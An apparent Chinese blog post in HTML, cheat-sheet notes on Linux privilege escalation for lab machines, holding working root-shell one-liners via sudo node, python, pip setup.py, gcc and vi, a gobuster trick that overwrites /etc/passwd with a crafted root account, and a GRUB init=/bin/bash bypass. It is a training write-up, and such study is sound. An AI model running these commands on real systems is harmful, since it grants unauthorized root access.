@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux笔记 - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="Linux笔记">
+  <meta property="og:description" content="linux提权 信息收集 hostname
+hostname命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-01T10:58:35+08:00">
+    <meta property="article:modified_time" content="2025-03-01T10:58:35+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="Linux笔记">
+  <meta name="twitter:description" content="linux提权 信息收集 hostname
+hostname命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/hmv_metamorphose/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux笔记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/linux%E7%AC%94%E8%AE%B0\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  2346 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/linux%E7%AC%94%E8%AE%B0\/","datePublished": "2025-03-01T10:58:35+08:00","dateModified": "2025-03-01T10:58:35+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux笔记</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a>&nbsp;<a href=""><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i></a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-03-01">2025-03-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2346 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;<span id="/linux%E7%AC%94%E8%AE%B0/" class="leancloud_visitors" data-flag-title="Linux笔记">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#linux提权">linux提权</a>
+      <ul>
+        <li><a href="#信息收集">信息收集</a></li>
+        <li><a href="#自动化工具">自动化工具</a></li>
+        <li><a href="#常见提权方式只写一些经常遇到的">常见提权方式(只写一些经常遇到的)</a>
+          <ul>
+            <li><a href="#内核漏洞">内核漏洞</a></li>
+            <li><a href="#sudo提权">sudo提权</a></li>
+            <li><a href="#gobuster提权">gobuster提权</a></li>
+            <li><a href="#直接写入">直接写入</a></li>
+            <li><a href="#pip提权">pip提权</a></li>
+            <li><a href="#写入密码">写入密码</a></li>
+            <li><a href="#gcc提权">gcc提权</a></li>
+            <li><a href="#vi逃逸">vi逃逸</a></li>
+          </ul>
+        </li>
+        <li><a href="#常用挤巧">常用挤巧</a>
+          <ul>
+            <li><a href="#文件上传or下载">文件上传or下载</a></li>
+            <li><a href="#shell">shell</a></li>
+            <li><a href="#靶机网卡配置">靶机网卡配置</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="linux提权">linux提权</h2>
+<h3 id="信息收集">信息收集</h3>
+<blockquote>
+<p>hostname</p></blockquote>
+<p>hostname命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息</p>
+<blockquote>
+<p>uname -a</p></blockquote>
+<p>将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞(searchsploit)时非常有用。</p>
+<blockquote>
+<p>/proc/version</p></blockquote>
+<p>proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的Linux版本中找到 proc，这使其成为您的工具库中必不可少的工具。
+查看/proc/version 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。</p>
+<blockquote>
+<p>/etc/issue</p></blockquote>
+<p>可以通过查看/etc/issue文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。</p>
+<blockquote>
+<p>ps</p></blockquote>
+<p>s命令是查看Linux系统上正在运行的进程的有效方法。
+在终端上输入ps将显示当前 shell 的进程。</p>
+<li>ps -a查看所有正在运行的进程
+<li>ps axjf查看进程树
+<li>ps aux aux选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未连接到终端的进程 (x)。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞
+<blockquote>
+<p>env</p></blockquote>
+<p>env命令将显示环境变量。
+PATH 变量可能具有编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。</p>
+<blockquote>
+<p>sudo -l</p></blockquote>
+<p>目标系统可以配置为允许用户以 root 权限运行某些（或全部）命令。 sudo -l命令可用于列出用户可以使用sudo运行的所有命令</p>
+<blockquote>
+<p>id</p></blockquote>
+<p>id命令将显示当前用户的身份信息。也可以显示是否磁盘挂载</p>
+<blockquote>
+<p>/etc/passwd</p></blockquote>
+<p>/etc/passwd文件包含有关所有用户帐户的信息。但是读的很慢，而且一堆信息可能没用，有用的都在/home下</p>
+<blockquote>
+<p>history</p></blockquote>
+<p>使用history命令查看早期命令可以让我们了解目标系统，并且（尽管很少）存储了密码或用户名等信息。</p>
+<blockquote>
+<p>ifconfig</p></blockquote>
+<p>ifconfig命令将显示网络接口的信息。ip a也可以，ip route命令可以查看存在哪些网络路由</p>
+<blockquote>
+<p>find</p></blockquote>
+<p>以下是“查找”命令的一些有用示例。</p>
+<ul>
+<li><code>find . -name flag1.txt</code>: 在当前目录中查找名为 &ldquo;flag1.txt&rdquo; 的文件</li>
+<li><code>find /home -name flag1.txt</code>: 在 <code>/home</code> 目录中查找名为 &ldquo;flag1.txt&rdquo; 的文件</li>
+<li><code>find / -type d -name config</code>: 在根目录 <code>/</code> 下查找名为 &ldquo;config&rdquo; 的目录</li>
+<li><code>find / -type f -perm 0777</code>: 查找具有 777 权限（所有用户均可读、写、执行）的文件</li>
+<li><code>find / -perm a=x</code>: 查找可执行文件</li>
+<li><code>find /home -user frank</code>: 在 <code>/home</code> 目录下查找属于用户 &ldquo;frank&rdquo; 的所有文件</li>
+<li><code>find / -mtime 10</code>: 查找过去 10 天内修改过的文件</li>
+<li><code>find / -atime 10</code>: 查找过去 10 天内访问过的文件</li>
+<li><code>find / -cmin -60</code>: 查找在过去一小时（60 分钟）内更改过的文件</li>
+<li><code>find / -amin -60</code>: 查找在过去一小时（60 分钟）内访问过的文件</li>
+<li><code>find / -size 50M</code>: 查找大小为 50 MB 的文件</li>
+</ul>
+<p>值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用“find”命令和“<code>-type f 2&gt;/dev/null</code>”将错误重定向到“<code>/dev/null</code>”并获得更清晰的输出。</p>
+<ul>
+<li><code>find / -writable -type d 2&gt;/dev/null</code>: 查找全局可写文件夹</li>
+<li><code>find / -perm -222 -type d 2&gt;/dev/null</code>: 查找全局可写文件夹</li>
+<li><code>find / -perm -o w -type d 2&gt;/dev/null</code>: 查找全局可写文件夹</li>
+<li><code>find / -perm -o x -type d 2&gt;/dev/null</code>: 查找全局可执行文件夹</li>
+</ul>
+<p>查找开发工具和支持的语言：</p>
+<ul>
+<li><code>find / -name perl*</code></li>
+<li><code>find / -name python*</code></li>
+<li><code>find / -name gcc*</code></li>
+</ul>
+<p>查找特定文件权限：</p>
+<ul>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>: 查找带有SUID位的文件，它允许我们以比当前用户更高的权限级别运行该文件。</li>
+</ul>
+<h3 id="自动化工具">自动化工具</h3>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreffer ">linPEAS</a></li>
+<li><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener noreffer ">LinEnum</a></li>
+<li><a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank" rel="noopener noreffer ">LES</a></li>
+<li><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreffer ">pspy</a></li>
+<li><a href="https://book.hacktricks.wiki/en/index.html" target="_blank" rel="noopener noreffer ">hack网站</a></li>
+</ul>
+<p>(使用方法自己看一眼就知道了)</p>
+<h3 id="常见提权方式只写一些经常遇到的">常见提权方式(只写一些经常遇到的)</h3>
+<h4 id="内核漏洞">内核漏洞</h4>
+<p>kali有集成工具searchsploit，输入版本号去找就行，然后上传到靶机里面</p>
+<h4 id="sudo提权">sudo提权</h4>
+<blockquote>
+<p>sudo node -e &lsquo;child_process.spawn(&quot;/bin/bash&quot;,{stdio: [0,1,2]})&rsquo;</p></blockquote>
+<h4 id="gobuster提权">gobuster提权</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">perl -e &#39;print crypt(&#34;1&#34;,&#34;aa&#34;)&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat a.py             
+</span></span><span class="line"><span class="cl">from flask import Flask, Response
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(__name__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/&#39;, defaults={&#39;path&#39;: &#39;&#39;})
+</span></span><span class="line"><span class="cl">@app.route(&#39;/&lt;path:path&gt;&#39;)
+</span></span><span class="line"><span class="cl">def catch_all(path):
+</span></span><span class="line"><span class="cl">    if len(path) == 36:
+</span></span><span class="line"><span class="cl">        return Response(status=404)
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        return Response(status=200)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#39;__main__&#39;:
+</span></span><span class="line"><span class="cl">    app.run(host=&#34;0.0.0.0&#34;, port=80)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python a.py
+</span></span><span class="line"><span class="cl"> * Serving Flask app &#39;a&#39;
+</span></span><span class="line"><span class="cl"> * Debug mode: off
+</span></span><span class="line"><span class="cl">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+</span></span><span class="line"><span class="cl"> * Running on all addresses (0.0.0.0)
+</span></span><span class="line"><span class="cl"> * Running on http://127.0.0.1:80
+</span></span><span class="line"><span class="cl"> * Running on http://192.168.64.3:80
+</span></span><span class="line"><span class="cl">Press CTRL+C to quit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#靶机
+</span></span><span class="line"><span class="cl">echo &#39;aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash&#39; &gt; aaa
+</span></span><span class="line"><span class="cl">sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">su - /aaa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="直接写入">直接写入</h4>
+<p>有些时候sudo -l你会发现可执行的是个可写入文件，那直接写入/bin/bash去提权即可
+又如python可以直接执行时</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo /usr/bin/python3 -c &#39;import os;os.execl(&#34;/bin/sh&#34;,&#34;sh&#34;,&#34;-p&#34;)&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="pip提权">pip提权</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TF=$(mktemp -d)
+</span></span><span class="line"><span class="cl">echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
+</span></span><span class="line"><span class="cl">pip install $TF
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="写入密码">写入密码</h4>
+<p>当/etc/passwd可以写入的时候，可以把root的密码设置为空，或者是openssl passwd -1去生成密码，把root的密码改了</p>
+<h4 id="gcc提权">gcc提权</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo gcc -wrapper /bin/sh,-s .
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="vi逃逸">vi逃逸</h4>
+<p>前提就是可以root执行vi，直接打开vi写入:!sh，本质是打开了一个shell</p>
+<h3 id="常用挤巧">常用挤巧</h3>
+<h4 id="文件上传or下载">文件上传or下载</h4>
+<p>个人常用sftp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.SFTP建立连接
+</span></span><span class="line"><span class="cl">sftp username@ip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.上传
+</span></span><span class="line"><span class="cl">上去之后直接put
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3.下载
+</span></span><span class="line"><span class="cl">上去之后直接get，或者是mget * 可以得到当前目录下的全部文件
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还有一个方法，本地利用python起一个服务，靶机利用wget下载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -m http.server 80
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="shell">shell</h4>
+<p>当你反弹shell准备提权，发现shell不是交互式的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/bin/script -qc /bin/bash /dev/null
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接一步到位</p>
+<h4 id="靶机网卡配置">靶机网卡配置</h4>
+<p>如果扫不到就按照下面操作</p>
+<ol>
+<li>
+<p>在Linux镜像成功安装后启动，连续按e进入编辑模式，修改ro及其后面信息为rw single init=/bin/bash免密进入系统。</p>
+</li>
+<li>
+<p>Ctrl+X进行保存(Mac为Control+X)进入系统。</p>
+</li>
+<li>
+<p>进入系统后，ip addr查看当前网卡信息，可以看到这里存在两个网卡，一个是lo回环网卡，另一个则是我们当前虚拟机设定使用的网卡(比如enp0s1)</p>
+</li>
+<li>
+<p>如果是Ubuntu &lt; 20.04版本，则通过<code>vi /etc/network/interfaces</code>修改该靶场的网卡名enp0s3为上面的enp0s1。如果Ubuntu &gt;= 20.04，则<code>vi nn fxxxx.yaml</code>进行修改。如果是CentOS，则在<code>/etc/sysconfig/network-scripts/ifcfg-xxx</code>中进行类似修改</p>
+</li>
+</ol>
+<p>注：常用于vulnhub靶场</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/linux%E7%AC%94%E8%AE%B0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/" data-title="Linux笔记" data-hashtags="渗透"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/" data-hashtag="渗透"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/" data-title="Linux笔记"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/" data-title="Linux笔记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/linux%E7%AC%94%E8%AE%B0/" data-title="Linux笔记"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/" class="prev" rel="prev" title="Hugo搭建以及主题完善"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hugo搭建以及主题完善</a>
+            <a href="/hmv_metamorphose/" class="next" rel="next" title="HMV Metamorphose">HMV Metamorphose<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got 